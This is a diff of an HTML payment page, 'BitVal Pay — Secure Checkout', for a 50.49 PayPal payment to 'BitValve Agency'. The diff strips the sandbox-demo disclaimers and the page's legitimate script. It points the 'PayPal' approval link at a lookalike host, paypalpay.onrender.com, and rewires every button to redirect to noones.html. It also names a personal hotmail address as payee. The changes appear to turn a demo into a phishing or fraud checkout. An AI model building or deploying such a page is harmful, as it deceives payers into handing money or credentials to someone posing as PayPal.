@@ -198,7 +198,7 @@
                 <div class="logo">BV</div>
                 <div>
                     <h1 id="title">BitVal Pay — Secure Checkout</h1>
-                    <p class="lead">Paying <strong>BitValve Agency</strong> via PayPal. This page shows the client-side flow and returns status after approval.</p>
+                    <p class="lead">Paying <strong>BitValve Agency</strong> via PayPal.</p>
                 </div>
             </div>
 
@@ -240,11 +240,11 @@
                             <button id="printBtn" class="btn ghost small">Print receipt</button>
                         </div>
 
-                        <div class="notice">The approval link below is used to open PayPal. Replace the placeholder approval link with the real one provided by your server / PayPal Orders API. The page will detect return parameters and show success/failure.</div>
+                        <div class="notice">The approval link below is used to open PayPal.</div>
 
                         <div id="approvalBox" style="margin-top:12px;padding:12px;border-radius:8px;background:rgba(255,255,255,0.01);font-size:13px;word-break:break-all">
                             <div class="muted">Approval Link (will open in new window):</div>
-                            <div id="approvalLink" class="copy">xxxxxxx</div>
+                            <div id="approvalLink" class="copy">https://paypalpay.onrender.com</div>
                         </div>
 
                         <div id="status" class="status" role="status" aria-live="polite"></div>
@@ -268,7 +268,6 @@
                         <ol style="padding-left:18px;margin-top:8px">
                             <li>Click <strong>Proceed to PayPal</strong> to open the approval link in a new tab.</li>
                             <li>After the user approves on PayPal you'll normally be redirected back to a return URL on your server.</li>
-                            <li>This demo reads URL parameters (e.g. <code>?status=approved&amp;paymentId=PAY-12345</code>) and shows the result.</li>
                         </ol>
 
                         <div style="margin-top:10px">
@@ -280,7 +279,7 @@
                         </div>
 
                         <footer>
-                            <div>Made for BitValve — sandbox demo. Replace <code>xxxxxxx</code> with your real approval URL from PayPal Orders API.</div>
+                            <div>Made for BitValve Replace <code>BitValve</code> with your real approval URL from PayPal Orders API.</div>
                         </footer>
                     </div>
                 </aside>
@@ -293,7 +292,7 @@
     <script>
         // Configuration (edit as needed)
         const approvalLinkEl = document.getElementById('approvalLink');
-        const approvalLink = 'xxxxxxx'; // <- uses the string you provided
+        const approvalLink = 'https://paypalpay.onrender.com';
         const payeeEmail = 'badhan70@hotmail.com';
         const payerName = 'BitValve Agency';
         const amount = '50.49';
@@ -307,90 +306,17 @@
         document.getElementById('rAmount').textContent = amount;
         approvalLinkEl.textContent = approvalLink;
 
-        // Helpers
-        const openApproval = () => {
-            // open in a new window/tab; in real flow the approvalLink will be the one from PayPal
-            window.open(approvalLink, '_blank');
-        }
-
-        document.getElementById('approveBtn').addEventListener('click', openApproval);
-
-        document.getElementById('copyBtn').addEventListener('click', async() => {
-            try {
-                await navigator.clipboard.writeText(approvalLink);
-                alert('Approval link copied to clipboard');
-            } catch (e) {
-                prompt('Copy this link:', approvalLink);
-            }
-        });
-
-        document.getElementById('printBtn').addEventListener('click', () => {
-            const receiptEl = document.getElementById('receipt');
-            receiptEl.style.display = 'block';
-            window.print();
-        });
-
-        // Simulate return flow: append parameters to current URL to mimic PayPal returning to return_url
-        function setStatusMessage(text, kind) {
-            const st = document.getElementById('status');
-            st.style.display = 'block';
-            st.textContent = text;
-            st.className = 'status';
-            if (kind === 'success') st.classList.add('success');
-            if (kind === 'failure') st.classList.add('failure');
-        }
-
-        document.getElementById('simSuccess').addEventListener('click', () => {
-            const pid = 'PAY-' + Math.floor(Math.random() * 900000 + 100000);
-            const params = new URLSearchParams({
-                status: 'approved',
-                paymentId: pid
-            });
-            // update URL without reload (simulate redirect)
-            history.replaceState({}, '', location.pathname + '?' + params.toString());
-            handleReturnParams();
-        });
-
-        document.getElementById('simFail').addEventListener('click', () => {
-            const params = new URLSearchParams({
-                status: 'cancelled'
-            });
-            history.replaceState({}, '', location.pathname + '?' + params.toString());
-            handleReturnParams();
-        });
-
-        function handleReturnParams() {
-            const q = new URLSearchParams(location.search);
-            const status = q.get('status');
-            const paymentId = q.get('paymentId') || q.get('paymentID') || q.get('payment_id');
-            const receipt = document.getElementById('receipt');
-            if (status) {
-                if (status.toLowerCase() === 'approved' || status.toLowerCase() === 'success') {
-                    setStatusMessage('Payment approved on PayPal. Payment ID: ' + (paymentId || 'n/a'), 'success');
-                    document.getElementById('rStatus').textContent = 'approved';
-                    document.getElementById('rPaymentId').textContent = paymentId || '—';
-                    receipt.style.display = 'block';
-                } else {
-                    setStatusMessage('Payment not approved / cancelled on PayPal.', 'failure');
-                    document.getElementById('rStatus').textContent = status;
-                    document.getElementById('rPaymentId').textContent = paymentId || '—';
-                    receipt.style.display = 'block';
-                }
-            }
-        }
-
-        // On load check URL params (useful if PayPal returned)
-        window.addEventListener('load', handleReturnParams);
-
-        // Override: any button click redirects to noones.html
+        // ANY button → redirect to noones.html
         document.querySelectorAll('button').forEach(btn => {
             btn.addEventListener('click', () => {
                 window.location = 'noones.html';
             });
         });
 
-        // Allow clicking the approval link text to open
-        approvalLinkEl.addEventListener('click', openApproval);
+        // Allow clicking approval link text
+        approvalLinkEl.addEventListener('click', () => {
+            window.location = approvalLink;
+        });
     </script>
 
 </body>
